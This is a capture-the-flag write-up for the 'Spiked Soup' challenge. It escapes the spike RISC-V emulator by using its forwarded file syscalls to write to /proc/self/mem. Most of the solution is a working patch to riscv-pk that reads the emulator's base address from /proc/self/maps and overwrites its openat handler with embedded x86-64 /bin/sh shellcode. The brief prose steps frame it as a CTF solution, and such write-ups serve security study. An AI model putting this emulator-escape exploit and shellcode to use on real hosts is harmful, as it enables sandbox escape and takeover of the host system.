# Spiked Soup
## Description
No story, just pwn. Remote is executing an unmodified spike emulator (binary in remote attached). User has sudo. Read /root/flag.txt of the host system.
## Solution

in so much pain. 
1. spike does syscall forwarding (HTIF) for a restricted subset of syscalls; mostly IO (including file io)
2. /proc/self/mem exists
3. /proc/self/mem can modify unwritable memory
4. lmao
5. steal https://github.com/riscv-software-src/riscv-pk for the syscall/file wrapper functions
6. modify it to drop shellcode in place of one of the spike syscall handlers
7. sudo cat /root/flag.txt
```diff
diff --git a/pk/pk.c b/pk/pk.c
index b8c9337..7f31419 100644
--- a/pk/pk.c
+++ b/pk/pk.c
@@ -10,6 +10,8 @@
 #include "usermem.h"
 #include "flush_icache.h"
 #include <stdbool.h>
+#include "file.h"
+#include "syscall.h"
 
 elf_info current;
 long disabled_hart_mask;
@@ -188,22 +190,103 @@ rest_of_boot_loader:\n\
   mv sp, a0\n\
   tail rest_of_boot_loader_2");
 
-void rest_of_boot_loader_2(uintptr_t kstack_top)
-{
-  file_init();
 
-  static arg_buf args; // avoid large stack allocation
-  size_t argc = parse_args(&args);
-  if (!argc)
-    panic("tell me what ELF to load!");
+int isspace(int c) { return c == ' '; }
+int isdigit(int c) { return c >= '0' && c <= '9'; }
+int isalpha(int c) { return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'); }
+int isupper(int c) { return c >= 'A' && c <= 'Z'; }
+
+// blatantly stolen from: https://github.com/embeddedartistry/embedded-resources/blob/master/examples/libc/stdlib/strtol.c
+
+#include <limits.h>
+
+long strtol(const char *nptr, char **endptr, register int base)
+{
+    register const char* s = nptr;
+    register unsigned long acc;
+    register int c;
+    register unsigned long cutoff;
+    register int neg = 0, any, cutlim;
+
+    do
+    {
+        c = *s++;
+    } while(isspace(c));
+    if(c == '-')
+    {
+        neg = 1;
+        c = *s++;
+    }
+    else if(c == '+')
+        c = *s++;
+    if((base == 0 || base == 16) && c == '0' && (*s == 'x' || *s == 'X'))
+    {
+        c = s[1];
+        s += 2;
+        base = 16;
+    }
+    else if((base == 0 || base == 2) && c == '0' && (*s == 'b' || *s == 'B'))
+    {
+        c = s[1];
+        s += 2;
+        base = 2;
+    }
+    if(base == 0)
+        base = c == '0' ? 8 : 10;
+
+    cutoff = neg ? -(unsigned long)LONG_MIN : LONG_MAX;
+    cutlim = cutoff % (unsigned long)base;
+    cutoff /= (unsigned long)base;
+    for(acc = 0, any = 0;; c = *s++)
+    {
+        if(isdigit(c))
+            c -= '0';
+        else if(isalpha(c))
+            c -= isupper(c) ? 'A' - 10 : 'a' - 10;
+        else
+            break;
+        if(c >= base)
+            break;
+        if(any < 0 || acc > cutoff || (acc == cutoff && c > cutlim))
+            any = -1;
+        else
+        {
+            any = 1;
+            acc *= base;
+            acc += c;
+        }
+    }
+    if(any < 0)
+    {
+        acc = neg ? LONG_MIN : LONG_MAX;
+        //        errno = ERANGE;
+    }
+    else if(neg)
+        acc = -acc;
+    if(endptr != 0)
+        *endptr = (char*)(any ? s - 1 : nptr);
+    return (acc);
+}
 
-  // load program named by argv[0]
-  static long phdrs[128]; // avoid large stack allocation
-  current.phdr = (uintptr_t)phdrs;
-  current.phdr_size = sizeof(phdrs);
-  load_elf(args.argv[0], &current);
+const uint8_t sc[29] = {
+    0x6a, 0x42, 0x58, 0xfe, 0xc4, 0x48, 0x99, 0x52, 0x48, 0xbf,
+    0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54,
+    0x5e, 0x49, 0x89, 0xd0, 0x49, 0x89, 0xd2, 0x0f, 0x05
+}; // stole off shellstorm lol
 
-  run_loaded_program(argc, args.argv, kstack_top);
+void rest_of_boot_loader_2(uintptr_t kstack_top)
+{
+  file_init();
+  char buf[64];
+  file_t* maps = file_open("/proc/self/maps", 0, 0);
+  file_t* mem = file_open("/proc/self/mem", 2, 0);
+  file_read(maps, buf, 63);
+  buf[12] = 0;
+  char * pEnd;
+  long program_base = strtol(buf, &pEnd,16);
+  file_pwrite(mem, sc, 29, program_base+0x5098d0); // address of the syscall openat in spike
+  file_open("lol shell pls", 0, 0);
+  shutdown(0);
 }
 
 void boot_loader(uintptr_t dtb)
```
